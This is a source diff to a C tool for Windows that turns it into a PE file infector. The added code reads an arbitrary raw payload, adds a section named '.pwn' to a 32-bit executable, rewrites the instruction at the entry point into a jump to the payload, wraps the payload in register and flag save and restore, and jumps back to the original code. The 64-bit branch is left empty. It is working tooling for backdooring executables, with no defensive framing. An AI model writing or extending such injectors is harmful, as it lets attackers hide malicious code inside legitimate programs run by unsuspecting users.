@@ -9,14 +9,24 @@ int readDOSHeader(HANDLE hFile);
 int readFileHeader(HANDLE hFile);
 int readOptionalHeader(HANDLE hFile);
 int createNewSection(HANDLE hFile);
+int insertCode(HANDLE hFile, BYTE* payloadSpace);
 
 TCHAR filePath[100];
+TCHAR payload[100];
+
+DWORD payloadSize = 0x0;
 
 struct _IMAGE_DOS_HEADER imageDOSHeader;
 struct _IMAGE_FILE_HEADER imageFileHeader;
 struct _IMAGE_OPTIONAL_HEADER imageOptionalHeader32;
 struct _IMAGE_OPTIONAL_HEADER64 imageOptionalHeader64;
 struct _IMAGE_SECTION_HEADER imageSectionHeader;
+struct _IMAGE_SECTION_HEADER imageTextSectionHeader;
+
+
+struct PushPopGeneralRegisterAndFlagsX86 {
+	BYTE opcode[2];
+}pushGeneralRegisterAndFlagsX86, popGeneralRegisterAndFlagsX86;
 
 DWORD bytesRead = 0;
 WORD magic = 0;
@@ -27,6 +37,57 @@ int main(int argc, char* argv[])
 		return 0;
 	}
 
+	pushGeneralRegisterAndFlagsX86.opcode[0] = 0x60;
+	pushGeneralRegisterAndFlagsX86.opcode[1] = 0x9C;
+
+	popGeneralRegisterAndFlagsX86.opcode[0] = 0x9D;
+	popGeneralRegisterAndFlagsX86.opcode[1] = 0x61;
+
+
+	HANDLE hPayloadFile = INVALID_HANDLE_VALUE;
+	HANDLE hHeap = GetProcessHeap();
+	byte* payloadSpace = NULL;
+
+	hPayloadFile = CreateFile(payload, GENERIC_READ, 0, NULL, OPEN_EXISTING, NULL, NULL);
+
+	if (hPayloadFile != INVALID_HANDLE_VALUE) {
+		printf("success opening payload file\n");
+
+		payloadSize = GetFileSize(hPayloadFile, NULL);
+
+		printf("payload size: 0x%lX\n", payloadSize);
+
+
+
+
+		payloadSpace = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, payloadSize);
+
+		if (ReadFile(hPayloadFile, payloadSpace, payloadSize, &bytesRead, NULL) == 0) {
+			HeapFree(hHeap, 0, payloadSpace);
+			CloseHandle(hHeap);
+
+			CloseHandle(hPayloadFile);
+			return 0;
+		}
+
+		for (size_t i = 0; i < payloadSize; i++) {
+			printf("%X, ", payloadSpace[i]);
+
+			if (i % 10 == 0) {
+				printf("\n");
+			}
+		}
+
+
+		CloseHandle(hPayloadFile);
+	}
+	else
+	{
+		errorHandling();
+		return 0;
+	}
+
+
 	HANDLE hFile = INVALID_HANDLE_VALUE;
 
 	hFile = CreateFile(filePath, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, NULL, NULL);
@@ -36,22 +97,40 @@ int main(int argc, char* argv[])
 		printf("success opening file\n");
 
 		if (readDOSHeader(hFile) != 0) {
+			HeapFree(hHeap, 0, payloadSpace);
+			CloseHandle(hHeap);
 			return 0;
 		}
 		if (readFileHeader(hFile) != 0) {
+			HeapFree(hHeap, 0, payloadSpace);
+			CloseHandle(hHeap);
 			return 0;
 		}
 		if (readOptionalHeader(hFile) != 0) {
+			HeapFree(hHeap, 0, payloadSpace);
+			CloseHandle(hHeap);
 			return 0;
 		}
 		if (createNewSection(hFile) != 0) {
+			HeapFree(hHeap, 0, payloadSpace);
+			CloseHandle(hHeap);
 			return 0;
 		}
+		if (insertCode(hFile, payloadSpace) != 0) {
+			HeapFree(hHeap, 0, payloadSpace);
+			CloseHandle(hHeap);
+			return 0;
+		}
+
 		CloseHandle(hFile);
 	}
 	else {
 		errorHandling();
 	}
+
+
+	HeapFree(hHeap, 0, payloadSpace);
+	CloseHandle(hHeap);
 
 	return 0;
 }
@@ -64,8 +143,10 @@ int init(int argc, char* argv[]) {
 		}
 		else
 		{
-			printf("path: %s\n", argv[4]);
+			printf("path raw code: %s\n", argv[2]);
+			printf("path PE: %s\n", argv[4]);
 
+			swprintf(payload, sizeof(payload) / sizeof(TCHAR), L"%hs", argv[2]);
 			swprintf(filePath, sizeof(filePath) / sizeof(TCHAR), L"%hs", argv[4]);
 		}
 	}
@@ -78,10 +159,124 @@ int init(int argc, char* argv[]) {
 	return 0;
 }
 
+int insertCode(HANDLE hFile, BYTE* payloadSpace) {
+
+	if (magic == 0x10b) {
+		SetFilePointer(hFile, imageDOSHeader.e_lfanew + sizeof(DWORD) + sizeof(imageFileHeader) + sizeof(imageOptionalHeader32), NULL, FILE_BEGIN);
+
+		ZeroMemory(&imageTextSectionHeader, sizeof(imageTextSectionHeader));
+
+		if (ReadFile(hFile, &imageTextSectionHeader, sizeof(imageTextSectionHeader), &bytesRead, NULL) == 0) {
+			errorHandling();
+			CloseHandle(hFile);
+			return -1;
+		}
+
+		DWORD rawEntryPoint = imageTextSectionHeader.PointerToRawData + (imageOptionalHeader32.AddressOfEntryPoint - imageTextSectionHeader.VirtualAddress);
+
+		printf("pointer to raw data: %lX\n", imageTextSectionHeader.PointerToRawData);
+		printf("entry point: %lX\n", imageOptionalHeader32.AddressOfEntryPoint);
+		printf("text virtual address: %lX\n", imageTextSectionHeader.VirtualAddress);
+		printf("raw entry point: %lX\n", rawEntryPoint);
+
+		BYTE opcode = 0x0;
+		LONG32 displacementRelToNextInst = 0x0;
+
+		SetFilePointer(hFile, rawEntryPoint + sizeof(opcode) + sizeof(displacementRelToNextInst), NULL, FILE_BEGIN);
+
+		if (ReadFile(hFile, &opcode, sizeof(opcode), &bytesRead, NULL) == 0) {
+			errorHandling();
+			CloseHandle(hFile);
+			return -1;
+		}
+
+		if (ReadFile(hFile, &displacementRelToNextInst, sizeof(displacementRelToNextInst), &bytesRead, NULL) == 0) {
+			errorHandling();
+			CloseHandle(hFile);
+			return -1;
+		}
+
+		printf("opcode: %X\n", opcode);
+		printf("displacement to next instruciton: %lX\n", displacementRelToNextInst);
+		printf("displacement to next instruciton: %ld\n", displacementRelToNextInst);
+
+
+
+		BYTE jmpOpcode = 0xE9;
+		DWORD jmpDisRelToNextInst = imageSectionHeader.VirtualAddress - (imageOptionalHeader32.AddressOfEntryPoint + (sizeof(BYTE) * 2) + (sizeof(DWORD) * 2));
+
+		printf("%lX\n", jmpDisRelToNextInst);
+
+		SetFilePointer(hFile, rawEntryPoint + sizeof(opcode) + sizeof(displacementRelToNextInst), NULL, FILE_BEGIN);
+
+		if (WriteFile(hFile, &jmpOpcode, sizeof(jmpOpcode), &bytesRead, NULL) == 0) {
+			errorHandling();
+			CloseHandle(hFile);
+			return -1;
+		}
+		if (WriteFile(hFile, &jmpDisRelToNextInst, sizeof(jmpDisRelToNextInst), &bytesRead, NULL) == 0) {
+			errorHandling();
+			CloseHandle(hFile);
+			return -1;
+		}
+
+		SetFilePointer(hFile, imageSectionHeader.PointerToRawData, NULL, FILE_BEGIN);
+
+		if (WriteFile(hFile, &pushGeneralRegisterAndFlagsX86, sizeof(pushGeneralRegisterAndFlagsX86), &bytesRead, NULL) == 0) {
+			errorHandling();
+			CloseHandle(hFile);
+			return -1;
+		}
+
+		if (WriteFile(hFile, payloadSpace, payloadSize, &bytesRead, NULL) == 0) {
+			errorHandling();
+			CloseHandle(hFile);
+			return -1;
+		}
+
+		if (WriteFile(hFile, &popGeneralRegisterAndFlagsX86, sizeof(popGeneralRegisterAndFlagsX86), &bytesRead, NULL) == 0) {
+			errorHandling();
+			CloseHandle(hFile);
+			return -1;
+		}
+
+		LONG32 jumpToOrginalCode = (imageSectionHeader.VirtualAddress + sizeof(pushGeneralRegisterAndFlagsX86) + sizeof(popGeneralRegisterAndFlagsX86) + payloadSize + 0x5) - (imageOptionalHeader32.AddressOfEntryPoint + (sizeof(BYTE) * 2) + (sizeof(DWORD) * 2));
+		jumpToOrginalCode *= -1;
+		printf("%ld\n", jumpToOrginalCode);
+		jumpToOrginalCode += displacementRelToNextInst;
+
+		printf("%lX\n", jumpToOrginalCode);
+
+		if (WriteFile(hFile, &opcode, sizeof(opcode), &bytesRead, NULL) == 0) {
+			errorHandling();
+			CloseHandle(hFile);
+			return -1;
+		}
+
+		if (WriteFile(hFile, &jumpToOrginalCode, sizeof(jumpToOrginalCode), &bytesRead, NULL) == 0) {
+			errorHandling();
+			CloseHandle(hFile);
+			return -1;
+		}
+
+	}
+	else if (magic == 0x20b) {
+
+	}
+	else
+	{
+		printf("unknown binary\n");
+		printf("currently only supports x86 and x64 PE\n");
+		return -1;
+	}
+
+	return 0;
+}
+
 int createNewSection(HANDLE hFile) {
 
 	BYTE name[] = { '.', 'p', 'w', 'n' };
-	DWORD virtualSize = 0x3E8;
+	DWORD virtualSize = payloadSize;
 
 	if (magic == 0x10b) {
 
